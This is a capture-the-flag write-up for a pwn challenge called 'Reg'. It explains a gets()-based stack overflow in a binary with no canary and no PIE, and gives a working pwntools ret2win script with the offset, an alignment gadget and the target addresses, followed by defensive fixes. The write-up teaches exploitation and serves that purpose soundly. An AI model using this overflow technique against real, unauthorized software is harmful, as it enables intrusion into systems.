## Overview

**Reg** is an Easy Pwn challenge. The binary reads your "name" with `gets()` — a function
with no length limit — into a 48-byte stack buffer that has **no stack canary** and **no
PIE**. That's a classic
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html)
([CWE-121](https://cwe.mitre.org/data/definitions/121.html)): overwrite the saved return
address and redirect execution to a hidden `winner()` function that opens and prints
`flag.txt`. This is the canonical *ret2win*.

## The technique

The two functions that matter:

```text
run():
    lea rax,[rbp-0x30]
    call gets            ; unbounded read into a 0x30 (48-byte) buffer

winner()  @ 0x401206:
    fopen("flag.txt") ; fgets ; puts   ; prints the flag — never called normally
```

`checksec` confirms the path is wide open:

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

No canary means nothing detects the overwrite; No-PIE means `winner()` sits at a fixed,
known address (`0x401206`). So the exploit is just: pad to the saved return address, then
return into `winner()`.

**Offset.** The buffer is at `rbp-0x30`, so reaching the saved return address costs
`0x30` (48) bytes of buffer + `8` bytes of saved `rbp` = **56 bytes**.

**Alignment gotcha.** When `winner()` calls glibc's `fopen`/`fgets`/`puts`, those routines
use `movaps` instructions that fault unless `rsp` is 16-byte aligned. Returning through one
extra bare `ret` gadget (`0x40101a`) before `winner()` fixes the alignment.

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *

WINNER = 0x401206
RET    = 0x40101a          # bare "ret" — 16-byte stack alignment for glibc movaps
OFFSET = 56                # 0x30 buffer + 8 saved rbp

payload = b'A' * OFFSET + p64(RET) + p64(WINNER)

io = remote('TARGET', 0)            # host, port of the spawned instance
io.sendline(payload)
print(io.recvall(timeout=6).decode())   # winner() prints "Congratulations!" + the flag
```

Run it against the live instance:

```bash
python3 solve.py <host> <port>
# Congratulations!
# HTB{...}
```

## Why it worked

`gets()` has no bounds, so the input runs past the buffer and overwrites the saved return
address. With no canary nothing notices, and with No-PIE the `winner()` address is a constant
you can hardcode — no information leak needed. The single extra `ret` keeps the stack aligned
so glibc's I/O functions don't crash.

## Fix / defense

- Never use `gets()`; use `fgets(buf, sizeof buf, stdin)` (or a bounded reader).
- Build with `-fstack-protector-all` (canary) and `-fPIE -pie` (randomize the binary base).
- Don't ship a function that reads the flag with no authentication — remove debug/"win"
  paths from production builds.
